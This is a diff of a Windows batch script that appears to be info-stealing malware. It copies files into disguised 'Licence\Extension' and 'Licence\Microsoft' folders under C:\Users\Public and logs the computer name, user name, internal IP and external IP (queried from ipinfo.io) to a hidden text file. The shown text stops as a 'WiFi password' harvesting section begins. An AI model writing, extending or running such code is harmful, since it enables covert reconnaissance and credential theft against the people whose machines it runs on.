@@ -45,6 +45,13 @@ echo *************Create directory****************
 
 
 
+echo *************Copy file****************
+      copy "C:\Users\%username%\AppData\Local\Temp\afolder\*.*" "C:\Users\Public\Licence\Extension\" /y > nul 2> nul
+      echo Copied!
+      echo.
+      echo.
+
+
 echo *************Changing working dir****************
    cd /D C:\Users\Public\Licence\Extension
    echo Success!
@@ -408,15 +415,15 @@ echo *************DOWNLOAD file****************
    timeout 3 > nul 2> nul    
 
    echo *************Find IP****************
-   echo Computer Name: %ComputerName% ^& %UserName% >"C:\Users\Public\Licence\Microsoft\IPnHost.txt"
-   echo. >>"C:\Users\Public\Licence\Microsoft\IPnHost.txt"
+   echo Computer Name: %ComputerName% ^& %UserName% >"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
+   echo. >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
    for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set ip=%%b
    set ip=%ip:~1%
-   echo Internal IP is:  %ip% >>"C:\Users\Public\Licence\Microsoft\IPnHost.txt"
+   echo Internal IP is:  %ip% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
    For /f %%A in (
    'powershell -nop -c "(Invoke-RestMethod http://ipinfo.io/json).IP"'
    ) Do Set ExtIP=%%A
-   echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\IPnHost.txt"
+   echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
 
    echo *************WiFi password****************
    setlocal enabledelayedexpansion
